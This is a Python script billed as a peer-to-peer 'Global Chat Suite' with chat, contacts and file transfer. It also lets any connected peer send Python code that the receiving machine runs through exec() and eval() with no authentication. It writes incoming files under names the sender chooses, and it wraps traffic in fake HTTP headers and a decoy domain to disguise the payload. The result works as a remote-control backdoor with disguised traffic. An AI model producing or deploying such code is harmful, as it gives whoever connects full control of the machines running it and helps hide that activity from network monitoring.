import socket
import threading
import json
import base64
import os
import sys
import uuid
import random
import string
import time



print ("_______________________")
print ("---Global Chat Suite---")
print (" ")
print ("_______________________")

# Global variables
DEFAULT_PORT = 9009
LISTEN_PORT = DEFAULT_PORT
server_socket = None
server_thread = None
running = True

peers = {}  # key: (ip, port), value: socket
contacts = {}  # key: name, value: (ip, port)
fake_domain = "example.com"
user_id = str(uuid.uuid4())

lock = threading.Lock()

# --- Utility Functions ---

def generate_random_header():
    """Generate a random header key to fake normal traffic."""
    headers = [
        "User-Agent", "Accept", "Accept-Language", "Connection", "Cache-Control",
        "Host", "Referer", "Origin", "Content-Type", "Cookie"
    ]
    return random.choice(headers)

def obfuscate_message(message_dict):
    """
    Wrap message content inside fake HTTP-like headers and random fields
    to disguise the true payload.
    """
    # Convert actual message dict to JSON string
    message_json = json.dumps(message_dict)

    # Random header keys with random values + real fake domain usage
    headers = {
        generate_random_header(): fake_domain,
        generate_random_header(): ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        "X-Trace-ID": str(uuid.uuid4()),
        "Content-Length": str(len(message_json)),
        "Content-Type": "application/json",
        "X-Payload": message_json  # Hide real message here
    }

    # Convert headers dict to a pseudo-HTTP header string
    header_lines = []
    for k, v in headers.items():
        header_lines.append(f"{k}: {v}")
    obfuscated = "\r\n".join(header_lines) + "\r\n\r\n"
    return obfuscated.encode('utf-8')

def deobfuscate_message(raw_bytes):
    """
    Extract JSON message from the obfuscated fake HTTP headers.
    Returns the original message dict or None if invalid.
    """
    try:
        raw_text = raw_bytes.decode('utf-8', errors='ignore')
        # Look for X-Payload header line
        for line in raw_text.split("\r\n"):
            if line.startswith("X-Payload:"):
                payload = line[len("X-Payload:"):].strip()
                return json.loads(payload)
    except Exception:
        pass
    return None

def send_message(sock, message_dict):
    obf = obfuscate_message(message_dict)
    sock.sendall(obf)

def recv_message(sock):
    try:
        data = sock.recv(4096)
        if not data:
            return None
        return deobfuscate_message(data)
    except Exception:
        return None

def save_contacts():
    try:
        with open("contacts.json", "w") as f:
            json.dump(contacts, f)
        print("[*] Contacts saved.")
    except Exception as e:
        print(f"[!] Failed to save contacts: {e}")

def load_contacts():
    global contacts
    try:
        if os.path.exists("contacts.json"):
            with open("contacts.json", "r") as f:
                contacts = json.load(f)
            print("[*] Contacts loaded.")
        else:
            contacts = {}
    except Exception as e:
        print(f"[!] Failed to load contacts: {e}")

def parse_ip_port(ip_port_str):
    """Parse string 'ip[:port]' and return tuple (ip, port)."""
    if ':' in ip_port_str:
        ip, port_str = ip_port_str.split(':', 1)
        try:
            port = int(port_str)
        except:
            port = LISTEN_PORT
    else:
        ip = ip_port_str
        port = LISTEN_PORT
    return ip, port

# --- Peer Handling ---

def handle_peer(conn, addr):
    ip, port = addr
    print(f"[*] Peer connected: {ip}:{port}")

    while running:
        msg = recv_message(conn)
        if msg is None:
            break

        msg_type = msg.get("type")
        sender_id = msg.get("user_id", "unknown")

        if msg_type == "chat":
            text = msg.get("message", "")
            print(f"[{sender_id}@{ip}:{port}] {text}")

        elif msg_type == "file":
            filename = msg.get("filename", "unknown")
            filedata_b64 = msg.get("data", "")
            try:
                filedata = base64.b64decode(filedata_b64)
                with open(filename, "wb") as f:
                    f.write(filedata)
                print(f"[{sender_id}@{ip}:{port}] Received file: {filename}")
            except Exception as e:
                print(f"[!] Error saving file from {ip}:{port}: {e}")

        elif msg_type == "pyexec":
            code = msg.get("code", "")
            print(f"[{sender_id}@{ip}:{port}] Executing Python code...")
            try:
                exec(code, globals())
                print("[*] Execution done.")
            except Exception as e:
                print(f"[!] Execution error: {e}")

        elif msg_type == "pyeval":
            expr = msg.get("expression", "")
            print(f"[{sender_id}@{ip}:{port}] Evaluating Python expression...")
            try:
                result = eval(expr, globals())
                print(f"[*] Eval result: {result}")
            except Exception as e:
                print(f"[!] Eval error: {e}")

        else:
            # Unknown or unhandled message type
            pass

    print(f"[*] Peer disconnected: {ip}:{port}")
    with lock:
        peers.pop((ip, port), None)
    conn.close()

def start_server(port):
    global server_socket, running
    running = True
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind(('', port))
    except Exception as e:
        print(f"[!] Failed to bind server on port {port}: {e}")
        return False
    server_socket.listen(5)
    print(f"[*] Listening on port {port} ...")

    def server_loop():
        while running:
            try:
                conn, addr = server_socket.accept()
                ip, port = addr
                with lock:
                    peers[(ip, port)] = conn
                threading.Thread(target=handle_peer, args=(conn, addr), daemon=True).start()
            except Exception:
                break

    global server_thread
    server_thread = threading.Thread(target=server_loop, daemon=True)
    server_thread.start()
    return True

def stop_server():
    global running, server_socket
    running = False
    if server_socket:
        try:
            server_socket.close()
        except:
            pass
        server_socket = None
    print("[*] Server stopped.")

def connect_to_peer(ip, port):
    with lock:
        if (ip, port) in peers:
            print(f"[!] Already connected to {ip}:{port}")
            return

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        with lock:
            peers[(ip, port)] = sock
        threading.Thread(target=handle_peer, args=(sock, (ip, port)), daemon=True).start()
        print(f"[*] Connected to {ip}:{port}")
    except Exception as e:
        print(f"[!] Failed to connect to {ip}:{port}: {e}")

def disconnect_all():
    with lock:
        for (ip, port), sock in list(peers.items()):
            try:
                sock.close()
            except:
                pass
            peers.pop((ip, port), None)
    print("[*] Disconnected all peers.")

def send_to_all(message_dict):
    with lock:
        for sock in list(peers.values()):
            try:
                send_message(sock, message_dict)
            except Exception as e:
                print(f"[!] Failed to send message to a peer: {e}")

def print_help():
    print("""
Available Commands:
/connect ip[:port]          - Connect to peer at IP and optional port (default current port).
/addcontact name ip[:port]  - Add contact alias with optional port.
/connectuser name[:port]    - Connect to contact by name with optional port.
/listcontacts               - List all saved contacts.
/sendfile filepath          - Send a file to all connected peers.
/fakesite domain            - Set fake domain to disguise traffic.
/py code                    - Run local Python code.
/pysend code                - Send Python exec code to peers.
/pyevalsend expr            - Send Python eval code to peers.
/myid                      - Show your user ID (UUID).
/exit                      - Quit the program.
/help                      - Show this help message.
/clear                     - Clear terminal screen.
/status                    - Show number of connected peers.
/savecontacts              - Save contacts to file.
/reloadcontacts            - Reload contacts from file.
/disconnectall             - Disconnect all peers.
/setport port              - Change the listening port dynamically.
""")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- Global Chat Suite 0.1 ---

def main():
    global LISTEN_PORT, fake_domain

    load_contacts()

    if not start_server(LISTEN_PORT):
        print("[!] Could not start server. Exiting.")
        sys.exit(1)

    print(f"Your User ID: {user_id}")
    print("Type /help for commands.")

    while True:
        try:
            command = input("> ").strip()
            if not command:
                continue

            if command.startswith("/"):
                parts = command.split(" ", 1)
                cmd = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""

                if cmd == "/connect":
                    ip, port = parse_ip_port(arg)
                    connect_to_peer(ip, port)

                elif cmd == "/addcontact":
                    try:
                        name_ip = arg.split(" ", 1)
                        if len(name_ip) != 2:
                            print("[!] Usage: /addcontact name ip[:port]")
                            continue
                        name, ipport = name_ip
                        ip, port = parse_ip_port(ipport)
                        contacts[name] = (ip, port)
                        print(f"[*] Contact '{name}' added as {ip}:{port}")
                    except Exception as e:
                        print(f"[!] Error adding contact: {e}")

                elif cmd == "/connectuser":
                    # Connect by contact name, optional port override: /connectuser name[:port]
                    if not arg:
                        print("[!] Usage: /connectuser name[:port]")
                        continue
                    if ':' in arg:
                        name, port_str = arg.split(':',1)
                        port = int(port_str)
                    else:
                        name = arg
                        port = None
                    if name not in contacts:
                        print(f"[!] Contact '{name}' not found.")
                        continue
                    ip, saved_port = contacts[name]
                    target_port = port if port is not None else saved_port
                    connect_to_peer(ip, target_port)

                elif cmd == "/listcontacts":
                    if not contacts:
                        print("[*] No contacts saved.")
                    else:
                        print("[*] Contacts:")
                        for name, (ip, port) in contacts.items():
                            print(f"  {name} -> {ip}:{port}")

                elif cmd == "/sendfile":
                    filepath = arg.strip()
                    if not os.path.isfile(filepath):
                        print("[!] File not found.")
                        continue
                    with open(filepath, "rb") as f:
                        data = base64.b64encode(f.read()).decode('utf-8')
                    message = {
                        "type": "file",
                        "filename": os.path.basename(filepath),
                        "data": data,
                        "user_id": user_id
                    }
                    send_to_all(message)
                    print(f"[*] File sent: {filepath}")

                elif cmd == "/fakesite":
                    domain = arg.strip()
                    if domain:
                        fake_domain = domain
                        print(f"[*] Fake domain set to: {fake_domain}")
                    else:
                        print("[!] Usage: /fakesite domain")

                elif cmd == "/py":
                    # Run local Python code
                    try:
                        exec(arg, globals())
                    except Exception as e:
                        print(f"[!] Local Python execution error: {e}")

                elif cmd == "/pysend":
                    # Send Python exec code to peers
                    message = {
                        "type": "pyexec",
                        "code": arg,
                        "user_id": user_id
                    }
                    send_to_all(message)
                    print("[*] Python code sent for execution.")

                elif cmd == "/pyevalsend":
                    # Send Python eval expression to peers
                    message = {
                        "type": "pyeval",
                        "expression": arg,
                        "user_id": user_id
                    }
                    send_to_all(message)
                    print("[*] Python eval expression sent.")

                elif cmd == "/myid":
                    print(f"Your User ID: {user_id}")

                elif cmd == "/exit":
                    print("[*] Exiting...")
                    disconnect_all()
                    stop_server()
                    sys.exit(0)

                elif cmd == "/help":
                    print_help()

                elif cmd == "/clear":
                    clear_screen()

                elif cmd == "/status":
                    with lock:
                        print(f"Connected peers: {len(peers)}")

                elif cmd == "/savecontacts":
                    save_contacts()

                elif cmd == "/reloadcontacts":
                    load_contacts()

                elif cmd == "/disconnectall":
                    disconnect_all()

                elif cmd == "/setport":
                    # Change server listening port dynamically
                    try:
                        new_port = int(arg.strip())
                        if not (1 <= new_port <= 65535):
                            print("[!] Invalid port number. Must be 1-65535.")
                            continue
                        if new_port == LISTEN_PORT:
                            print("[*] Already listening on that port.")
                            continue
                        print(f"[*] Changing port from {LISTEN_PORT} to {new_port} ...")
                        stop_server()
                        if start_server(new_port):
                            LISTEN_PORT = new_port
                            print(f"[*] Now listening on port {LISTEN_PORT}.")
                        else:
                            print("[!] Failed to start server on new port. Reverting...")
                            start_server(LISTEN_PORT)
                    except Exception as e:
                        print(f"[!] Port change error: {e}")

                else:
                    print("[!] Unknown command. Type /help for list.")

            else:
                # Send chat message to all peers
                if not peers:
                    print("[!] No peers connected.")
                    continue
                message = {
                    "type": "chat",
                    "message": command,
                    "user_id": user_id
                }
                send_to_all(message)

        except KeyboardInterrupt:
            print("\n[*] Keyboard Interrupt detected, exiting...")
            disconnect_all()
            stop_server()
            sys.exit(0)
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()

